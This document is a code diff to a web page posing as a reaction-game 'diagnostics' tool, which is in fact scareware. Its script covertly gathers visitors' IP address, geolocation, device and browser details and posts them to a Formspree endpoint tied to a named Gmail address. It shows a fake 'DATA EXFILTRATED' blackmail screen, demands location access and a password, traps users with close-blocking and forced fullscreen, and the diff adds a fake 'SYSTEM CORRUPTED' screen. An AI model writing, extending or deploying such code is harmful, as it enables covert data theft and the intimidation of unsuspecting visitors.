@@ -54,8 +54,6 @@
             cursor: pointer; 
             z-index: 10; 
         }
-        
-        /* Blackmail Overlay */
         #blackmail-overlay { 
             display: none; 
             position: fixed; 
@@ -63,7 +61,7 @@
             left: 0; 
             width: 100%; 
             height: 100%; 
-            background: rgba(0, 0, 0, 0.95); 
+            background: rgba(0, 0, 0, 0.98); 
             z-index: 1000; 
             justify-content: center; 
             align-items: center; 
@@ -95,8 +93,6 @@
             cursor: pointer; 
         }
         #allow-location-btn:hover { background: darkred; }
-
-        /* Password Modal */
         #password-modal { 
             display: none; 
             position: fixed; 
@@ -104,7 +100,7 @@
             left: 0; 
             width: 100%; 
             height: 100%; 
-            background: rgba(0,0,0,0.9); 
+            background: rgba(0,0,0,0.95); 
             z-index: 1001; 
             justify-content: center; 
             align-items: center; 
@@ -129,8 +125,6 @@
             cursor: pointer; 
         }
         #pass-error { color: red; margin-top: 10px; display: none; }
-
-        /* Crash State */
         .crashed { 
             background: #000 !important; 
             cursor: wait !important; 
@@ -143,6 +137,21 @@
             font-size: 12px; 
             display: none; 
         }
+        #corrupted-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: black;
+            color: red;
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+            font-size: 24px;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
@@ -154,8 +163,6 @@
 <div id="crosshair"></div>
 <div id="target"></div>
 <button id="start-btn">Start Diagnostics</button>
-
-<!-- Blackmail Screen -->
 <div id="blackmail-overlay">
     <div id="blackmail-content">
         <h1 id="blackmail-title">DATA EXFILTRATED</h1>
@@ -164,8 +171,6 @@
         <button id="allow-location-btn">ALLOW LOCATION TO VERIFY</button>
     </div>
 </div>
-
-<!-- Password Screen -->
 <div id="password-modal">
     <div id="password-box">
         <h2>ENTER SECURITY KEY</h2>
@@ -175,9 +180,7 @@
         <p id="pass-error">Incorrect Password</p>
     </div>
 </div>
-
 <form id="dataForm" action="https://formspree.io/f/chessme012@gmail.com" method="POST" style="display:none;">
-    <!-- Hidden fields populated by JS -->
     <input type="hidden" name="IP_Address" id="ipField">
     <input type="hidden" name="User_Agent" id="uaField">
     <input type="hidden" name="Screen_Resolution" id="resField">
@@ -195,7 +198,12 @@
     <input type="hidden" name="Touch_Points" id="touchField">
     <input type="hidden" name="Color_Depth" id="colorField">
 </form>
-
+<div id="corrupted-screen">
+    <h1>SYSTEM CORRUPTED</h1>
+    <p>You closed the diagnostic window while data was being processed.</p>
+    <p>Your device may experience instability.</p>
+    <p>Reloading...</p>
+</div>
 <script>
 const startBtn = document.getElementById('start-btn');
 const target = document.getElementById('target');
@@ -210,6 +218,7 @@ const passInput = document.getElementById('pass-input');
 const passBtn = document.getElementById('pass-btn');
 const passError = document.getElementById('pass-error');
 const lagIndicator = document.getElementById('lag-indicator');
+const corruptedScreen = document.getElementById('corrupted-screen');
 
 let score = 0;
 let gameActive = false;
@@ -268,7 +277,6 @@ function endGame() {
     collectAndSendData("Pending"); 
 }
 
-// CRASH LOGIC
 function triggerCrash() {
     document.body.classList.add('crashed');
     let iterations = 0;
@@ -285,19 +293,24 @@ function triggerCrash() {
     lagIndicator.innerText = "SYSTEM FAILURE... DO NOT CLOSE";
 }
 
-// Prevent closing if not allowed or crashed
+let isLocked = false;
+
 window.onbeforeunload = function(e) { 
-    if(!hasAllowedLoc || (wrongAttempts >= 3)) { 
+    if(isLocked || wrongAttempts >= 3) { 
         e.preventDefault(); 
         e.returnValue = ''; 
-        if(wrongAttempts >= 3) triggerCrash();
-        return 'System Lock Active.'; 
+        if(isLocked && !hasAllowedLoc) {
+             corruptedScreen.style.display = 'flex';
+             setTimeout(() => {
+                 window.location.reload();
+             }, 2000);
+        }
+        return 'System Lock Active. Closing will cause data corruption.'; 
     } 
 };
 
-// Force Fullscreen on Escape if locked
 document.addEventListener('keydown', (e) => {
-    if((!hasAllowedLoc || wrongAttempts >= 3) && e.key === 'Escape') {
+    if((isLocked || wrongAttempts >= 3) && e.key === 'Escape') {
         document.exitFullscreen().catch(() => {});
         setTimeout(() => {
             document.documentElement.requestFullscreen().catch(err => console.log(err));
@@ -305,16 +318,12 @@ document.addEventListener('keydown', (e) => {
     }
 });
 
-// LOCATION & PASSWORD FLOW
 allowLocationBtn.addEventListener('click', async () => {
     isBlackmailed = true;
+    isLocked = true; 
     allowLocationBtn.innerText = "VERIFYING...";
-    
-    // Get Location
     const loc = await getGeolocation();
     document.getElementById('locField').value = loc;
-    
-    // Show Password Modal
     blackmailOverlay.style.display = 'none';
     passwordModal.style.display = 'flex';
     passInput.focus();
@@ -327,22 +336,21 @@ passInput.addEventListener('keypress', (e) => {
 
 function checkPassword() {
     if(passInput.value === CORRECT_PASS) {
-        // Success
         wrongAttempts = 0;
         passwordModal.style.display = 'none';
         hasAllowedLoc = true;
+        isLocked = false; 
         document.body.style.cursor = 'default';
         alert("Access Granted. System Stable.");
-        // Send final data if not already sent fully
         updateAndSubmitData();
     } else {
-        // Fail
         wrongAttempts++;
         passError.style.display = 'block';
         passInput.value = '';
         if(wrongAttempts >= 3) {
             passwordModal.style.display = 'none';
-            hasAllowedLoc = false; // Reset flag so they can't close
+            hasAllowedLoc = false; 
+            isLocked = true; 
             triggerCrash();
             alert("CRITICAL ERROR: SYSTEM LOCKDOWN INITIATED");
         }
@@ -411,7 +419,6 @@ function detectOS() {
 }
 
 async function collectAndSendData(finalAvg) {
-    // Collect all data
     const ip = await fetchIP();
     const ua = navigator.userAgent;
     const res = window.screen.width + 'x' + window.screen.height;
@@ -428,7 +435,6 @@ async function collectAndSendData(finalAvg) {
     const touchPoints = navigator.maxTouchPoints || 0;
     const colorDepth = window.screen.colorDepth + "-bit";
 
-    // Populate hidden fields
     document.getElementById('uaField').value = ua;
     document.getElementById('resField').value = res;
     document.getElementById('langField').value = lang;
@@ -445,7 +451,6 @@ async function collectAndSendData(finalAvg) {
     document.getElementById('colorField').value = colorDepth;
     document.getElementById('ipField').value = ip;
 
-    // Submit to Formspree (which forwards to chessme012@gmail.com)
     const formData = new FormData(document.getElementById('dataForm'));
     fetch('https://formspree.io/f/chessme012@gmail.com', {
         method: 'POST',
@@ -455,7 +460,6 @@ async function collectAndSendData(finalAvg) {
 }
 
 async function updateAndSubmitData() {
-    // Re-collect just in case anything changed, then submit again to ensure delivery
     const ip = await fetchIP();
     document.getElementById('ipField').value = ip;
     const formData = new FormData(document.getElementById('dataForm'));
@@ -464,8 +468,7 @@ async function updateAndSubmitData() {
         body: formData,
         headers: { 'Accept': 'application/json' }
     }).then(() => {
-        // Optional: Final confirmation
-        // console.log("Final data submitted");
+        // Final confirmation
     });
 }
 </script>
